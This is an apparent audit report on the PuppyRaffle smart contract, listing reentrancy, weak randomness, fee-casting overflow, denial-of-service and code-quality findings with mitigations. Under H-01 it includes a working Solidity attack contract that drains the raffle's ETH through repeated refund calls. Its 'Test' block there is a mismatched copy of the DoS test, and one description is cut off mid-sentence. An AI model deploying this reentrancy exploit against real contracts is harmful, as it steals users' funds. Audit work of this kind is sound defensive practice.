### [H-01] Sending ETH before state (player's balance) update leads to a Reentrancy attack by a malicious participant

**Description:** In the `PuppyRaffle:refund` function, the execution of sending `entranceFee` ETHER amount before updating `players[playerIndex]` balance can be exploited by a malicious participant to create an Attacking Contract that would act as a player, call the `PuppyRaffle:refund` function, when the ETHER gets received, some code can be written within the `receive() payable` function to reenter the code before the balance of the `players[playerIndex]` _address => uint256_ mapping is changed to `0`

**Impact:** A malicious contract can keep calling the `PuppyRaffle:refund` function within the `receive() payable` function to drain all the ETHER contained in the **PuppyRaffle SC**.

**Proof of Concept:** (Proof of Code)

<details>

<summary>Code: <b>AttackPuppyRaffle</b></summary>

```js
contract AttackPuppyRaffleReentrancyUsingStake {
    PuppyRaffle puppyRaffle;
    address payable owner;
    uint256 playerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        owner = msg.sender;
    }

    function attack() public payable {
        require(
            msg.value == puppyRaffle.entranceFee(),
            "Better send exact ETH (entranceFee) to run this hack"
        );

        // we need to enter game, put our stake
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);

        // let's call refund
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner fit collect funds!");

        (bool success, ) = owner.call{value: address(this).balance}("");

        require(success, "Something sup: Failed to send balance");
    }

    receive() external payable {
        // as we don receive ETH, make we refund again recursively
        if (address(puppyRaffle).balance >= 1 ether) {
            puppyRaffle.refund(playerIndex);
        }
    }
}
```

</details>

<details>

<summary>Code: <b>Test</b></summary>

```js
function testEnterRaffleDos() public {
    vm.deal(address(this), 4 ether);
    address[] memory players = new address[](1);
    uint256 gasUsed;
    uint256 prevGas = gasleft();
    players[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    gasUsed = prevGas - gasleft();

    players[0] = playerTwo;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertLt(gasUsed, prevGas - gasleft());

    gasUsed = prevGas - gasleft();

    players[0] = playerThree;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertLt(gasUsed, prevGas - gasleft());

    gasUsed = prevGas - gasleft();

    players[0] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertLt(gasUsed, prevGas - gasleft());
}
```

</details>

<br/>

**Recommended Mitigation:** Below are a couple preventions to prevent the Reentrancy Attack since it's a common Attack Vector:

1. **Performing a Check-Effect-Interactions after restructuring code.**

Navigate to **LINE** [ 123 - 125] in the `PuppyRaffle:refund` function and perform the **C.E.I** below.

```diff
-   payable(msg.sender).sendValue(entranceFee);
-
-   players[playerIndex] = address(0);

+   players[playerIndex] = address(0);
+
+    payable(msg.sender).sendValue(entranceFee);
```

2. **Locks on Functions**: to prevent reentrancy.
   Refactor code and implement the logic below:

<details>

<summary>Code</summary>

```c
bool locked = false;

function withdrawBal() public {
    uint256 bal = userBalance[msg.sender];
    require(!locked, "Wait for current call to end");

    locked = true;
    (bool success, ) = msg.sender.call{value: bal}("");

    require(success, "Something went wrong: Could not send ETH");
    locked = false;
}
```

</details>

### [H-02] Use of hash of predictable on-chain data to determine winnerIndex can be exploited to make RNG more deterministic

**Description:** As a result of using on-chain data to produce an hash that generates the `winnerIndex`, a malicious miner can position their address to get added, call the `PuppyRaffle:selectWinner` function just when the on-chain data have being determined and in their favour to claim the reward as the winner.

**Impact:** This causes the randomness stated in the docs to be undermined, allowing a malicious actor to keep winning the rewards and NFT therein.

**Proof of Concept:** (None)

**Recommended Mitigation:** Use of trusted oracles such as [Chainlink VRF](https://docs.chain.link/vrf) to generate less predictable random numbers

### [H-03] Casting of uint256 fee to uint64 causes of integer overflow

**Description:** In `PuppyRaffle:selectWinner` function, casting `uint256 fee` variable to `uint64` i.e `totalFees = totalFees + uint64(fee)` causes integer overflow.

**Impact:** An integer overflow which gives a lesser value for the `fee` value for the `feeAddress`.

**Proof of Concept:** Proof of Code

<details>

<summary>Code</summary>

```js
function testOverflowDuesToFeeCasting() public {
    uint256 playersLength = ((type(uint64).max / 1 ether) + 1) * 5; // i.e 0.2 => 1/5
    address[] memory newPlayers = new address[](playersLength);

    for (uint256 i = 0; i < playersLength; i++) {
        newPlayers[i] = address(i + 1);
    }
    vm.deal(address(this), playersLength * 1 ether);

    puppyRaffle.enterRaffle{value: playersLength * 1 ether}(newPlayers);

    // let's selectWinner
    vm.warp(block.timestamp + duration);
    puppyRaffle.selectWinner();

    uint256 totalFees = puppyRaffle.totalFees();
    uint256 expectedTotalFees = (address(puppyRaffle).balance * 20) / 100;

    assertLt(totalFees, expectedTotalFees);
}
```

</details>

<br/>

**Recommended Mitigation:**

Refactor code in the following places:

1. **LINE** [ 30 ]

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
```

2. `PuppyRaffle:selectWinner` **LINE** [ 168 ]

```diff
-   totalFees = totalFees + uint64(fee);
+   totalFees = totalFees + fee;
```

### [M-01] Unbounded players' array length in for loop becomes too expensive for other participants to enter raffle causing a DoS

**Description:** In the _check for duplicates_ section in the `PuppyRaffle:enterRaffle` function, having an increasing `players.length` value makes running the function expensive for later participants which can eventually lead to a Denial of Service (DoS) cause of the number of iteration costs going beyond the gas limit.

**Impact:** The skyrocketing gas costs for users entering the raffle at later stages could deter participation. Also, an attacker with large resources could monopolize the system, crowding out other potential participants.

**Proof of Concept:**

<details>

<summary>Code</summary>

```js
function testEnterRaffleDos() public {
    vm.deal(address(this), 4 ether);
    address[] memory players = new address[](1);
    uint256 gasUsed;
    uint256 prevGas = gasleft();
    players[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    gasUsed = prevGas - gasleft();

    players[0] = playerTwo;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertLt(gasUsed, prevGas - gasleft());

    gasUsed = prevGas - gasleft();

    players[0] = playerThree;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertLt(gasUsed, prevGas - gasleft());

    gasUsed = prevGas - gasleft();

    players[0] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertLt(gasUsed, prevGas - gasleft());
    }
```

</details>

<br/>

**Recommended Mitigation:** I recommend altering the manner in which duplicate players are checked – switching from an iteration-based system to a mapping-based system – which would be a far more gas-efficient solution.

Possible solutions include:

1. Using mapping for duplicate checks

```js
mapping(address => bool) entered;
if (entered[_address])return true;
```

2. Leveraging [OpenZeppelin's Enumerable Library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet)

### [M-02] Player address that is a smart contract with missing payable fallback function prevents selection of winner

**Description:** In the case of having a smart contract entered as a player, and the smart contract gets selected as winner, missing payable fallback function causes the `call` function to revert.

**Impact:** Unable to reward a smart contract that gets drawn their reward

**Proof of Concept:** Proof of Code

Below is a test showing how a contract missing fallback `receive() payable` and `fallback() payable` functions does not accept ETHER transfers.

<details>

<summary>Code: <b>MissingFallbackToReceiveEther</b> Contract</summary>

```js
contract MissingFallbackToReceiveEther {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}
```

</details>

<details>

<summary>Code: <b>Test</b></summary>

```js
function testSendEthToSCWithoutFallback() public {
    vm.deal(address(this), 2 ether);
    uint256 initialBal = address(this).balance;
    MissingFallbackToReceiveEther myContract = new MissingFallbackToReceiveEther();

    vm.expectRevert();
    (bool success, ) = payable(address(myContract)).call{value: 1 ether}(
        ""
    );
    require(success);

    uint256 currentBal = address(this).balance;
    assertEq(currentBal, initialBal);
}
```

</details>

Running `forge test --mt testSendEthToSCWithoutFallback -vvvv` gives the following result:

```shell
[PASS] testSendEthToSCWithoutFallback() (gas: 98683)
Traces:
  [98683] MyPuppyRaffleTest::testSendEthToSCWithoutFallback()
    ├─ [0] VM::deal(MyPuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000 [2e18])
    │   └─ ← ()
    ├─ [54216] → new MissingFallbackToReceiveEther@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← 160 bytes of code
    ├─ [0] VM::expectRevert(custom error f4844814:)
    │   └─ ← ()
    ├─ [45] MissingFallbackToReceiveEther::fallback{value: 1000000000000000000}()
    │   └─ ← EvmError: Revert
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.09ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

<br/>

**Recommended Mitigation:** Before accepting players, perform `address.code.length > 0` check to ensure that only EOAs can participate in the PuppyRaffle draw.

### [I-01] Functions used only outside the smart contract should be marked as external to improve readablity

**Description:** Functions like `enterRaffle`, `refund`, and `selectWinner` are not used within the smart contract hence,

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:** Should be marked as `external` to improve readability.

### [I-02] \_isActivePlayer function is not used anywhere within the contract leading to waste of gas and redundant cluster in codebase

**Description:** The `function _isActivePlayer() internal view returns (bool)` serves no purpose seeing that it is marked as `internal` and is intended to make use of `msg.sender` which is impossible.

**Impact:** Redundant cluster in codebase and use of some amount of gas

**Proof of Concept:**

**Recommended Mitigation:** Refactor code as below

```diff
-   function _isActivePlayer() internal view returns (bool) {
-       for (uint256 i = 0; i < players.length; i++) {
-           if (players[i] == msg.sender) {
-               return true;
-           }
-       }
-       return false;
-   }

+
```

### [I-03] Poor naming convention of variables makes readability difficult

**Description:** Lack of implementation of standard naming convention for **storage**, **immutable** variables is missing throughout the `PuppyRaffle` smart contract causing difficulty in readability of code.

**Impact:** Code readability is difficult.

**Proof of Concept:**

**Recommended Mitigation:** The below can be implemented for the stated and related cases:

- `entranceFee` is immutable, variable can be renamed to `i_entranceFee` for easier identification when reading through codebase.

- `raffleDuration` does not get changed throughout the lifecycle of smart contract hence, can be marked as **immutable**. It's also gas efficient.

### [I-04] Use of magic numbers instead of explanatory variable names

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:** Refactor code in `PuppyRaffle:selectWinner` **LINE** [ 166 - 167 ]

```diff
-   uint256 prizePool = (totalAmountCollected * 80) / 100;
-   uint256 fee = (totalAmountCollected * 20) / 100;

+   uint256 prizePoolPercentage = 80;
+   uint256 feePercentage = 20;
+   uint256 prizePool = (totalAmountCollected * prizePoolPercentage) / 100;
+   uint256 fee = (totalAmountCollected * feePercentage) / 100;
```

### [I-05] Floating solidity version

**Description:** Code

```js
pragma solidity ^0.7.6;
```

Contracts should use strict versions of solidity to ensure that the version used during tests is the same used for deployment.

**Impact:** Could lead to unintended results

**Proof of Concept:**

**Recommended Mitigation:** Use a strict solidity version.
